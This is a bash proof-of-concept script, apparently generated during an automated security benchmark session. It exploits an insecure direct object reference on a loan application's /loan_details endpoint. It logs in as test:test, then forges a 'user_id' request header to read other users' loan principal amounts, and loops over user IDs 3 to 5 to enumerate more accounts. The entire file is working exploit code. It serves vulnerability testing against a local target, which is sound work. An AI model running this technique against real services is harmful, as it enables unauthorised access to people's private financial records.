#!/bin/bash
# POC: IDOR vulnerability on /loan_details endpoint - Demonstrates unauthorized access to other users' loan financial data via user_id header
# Target: ./repo
# Created: 2025-12-01T16:22:28.104Z
# Session: benchmark-XBEN-104-24-minci3mm

# IDOR on /loan_details endpoint - Unauthorized Access to Other Users' Financial Data
# This POC demonstrates unauthorized access to loan details of other users

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] IDOR on /loan_details endpoint - POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login with test:test credentials
echo "[*] Step 1: Authenticating as test:test user"
curl -s -c /tmp/cookies.txt \
  -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  > /dev/null 2>&1

sleep 1

# Verify authentication
if [ ! -f /tmp/cookies.txt ] || ! grep -q "session" /tmp/cookies.txt; then
  echo "[-] Failed to obtain session cookie"
  rm -f /tmp/cookies.txt
  exit 1
fi

echo "[+] Successfully authenticated"
echo ""

# Step 2: Access own loan details (user_id=1)
echo "[*] Step 2: Accessing own loan details (authenticated user)"
echo "[*] GET $TARGET_URL/loan_details"
echo ""

OWN_LOAN=$(curl -s -b /tmp/cookies.txt "$TARGET_URL/loan_details" 2>&1)

# Extract loan principal from response
OWN_PRINCIPAL=$(echo "$OWN_LOAN" | grep -oP 'principal is \K[0-9.]+' | head -1)
echo "[*] Own loan principal: $OWN_PRINCIPAL"
echo ""

# Step 3: Test IDOR - Access loan details of user_id=2 via header
echo "[*] Step 3: Testing IDOR - Accessing loan details of user_id=2 via header"
echo "[*] GET $TARGET_URL/loan_details -H 'user_id: 2'"
echo ""

VICTIM_LOAN=$(curl -s -b /tmp/cookies.txt \
  -H "user_id: 2" \
  "$TARGET_URL/loan_details" 2>&1)

# Extract loan principal from victim
VICTIM_PRINCIPAL=$(echo "$VICTIM_LOAN" | grep -oP 'principal is \K[0-9.]+' | head -1)

echo "[*] Response shows loan principal: $VICTIM_PRINCIPAL"
echo ""

if [ ! -z "$VICTIM_PRINCIPAL" ]; then
  echo "[+] IDOR CONFIRMED: Successfully accessed user_id=2 loan details"
  echo "[+] Victim loan principal: $VICTIM_PRINCIPAL"
else
  echo "[-] Could not extract loan data from response"
fi

echo ""

# Step 4: Test multiple user enumeration
echo "[*] Step 4: Testing user enumeration - Accessing loan details for user_ids 3-5"
echo ""

for user_id in 3 4 5; do
  RESPONSE=$(curl -s -b /tmp/cookies.txt \
    -H "user_id: $user_id" \
    "$TARGET_URL/loan_details" 2>&1)
  
  PRINCIPAL=$(echo "$RESPONSE" | grep -oP 'principal is \K[0-9.]+' | head -1)
  
  if [ ! -z "$PRINCIPAL" ]; then
    echo "[+] user_id=$user_id: principal=$PRINCIPAL"
  else
    echo "[-] user_id=$user_id: Could not access or no data"
  fi
done

echo ""
echo "[*] Step 5: Confirming difference between own and accessed data"
echo ""

if [ ! -z "$OWN_PRINCIPAL" ] && [ ! -z "$VICTIM_PRINCIPAL" ] && [ "$OWN_PRINCIPAL" != "$VICTIM_PRINCIPAL" ]; then
  echo "[+] VULNERABILITY CONFIRMED: Accessed different user's loan data"
  echo "[+] Own principal ($OWN_PRINCIPAL) differs from victim principal ($VICTIM_PRINCIPAL)"
  echo "[+] This proves IDOR vulnerability allowing access to other users' loan details"
else
  echo "[*] Note: Could not confirm distinct data sets"
fi

echo ""
echo "[*] POC Complete"

# Cleanup
rm -f /tmp/cookies.txt